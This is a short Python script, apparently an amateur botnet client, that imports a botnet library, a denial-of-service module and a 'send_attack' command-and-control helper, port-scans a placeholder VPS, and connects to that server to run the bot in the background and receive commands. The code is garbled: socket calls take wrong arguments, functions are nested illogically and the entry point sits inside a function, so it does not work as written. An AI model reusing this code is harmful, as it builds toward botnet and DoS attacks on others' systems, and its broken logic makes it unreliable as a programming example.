from pybotnet import BotNet ,dos
import nmap
import socket
from cnc import send_attack

ip = 'vps ip server'
port = 'vps port server'


def portscanner():
    nm = nmap.PortScanner()
    nm.scan('ip of vps','port of vps')
    nm.scaninfo()
    nm.command_line()
    

    def host():
        nm.all_hosts('127.0.0.1')
        print(nm.scaninfo())
        host = socket.gethostname()


        def server():
            sock = socket.socket(socket.AF_INET,socket.AF_INET6,socket.IPPROTO_UDP,socket.SOCK_RAW)
            sock.connect(ip,port)
            socket.listen()
            BotNet.run_background()
            if socket.connect(ip,port):
                print('connected to server')
                data = server.recv(1024).decode()
                print('recieved from server + data')
                server.socket.close()
                return 0


            if __name__ == '__main__':
                server()
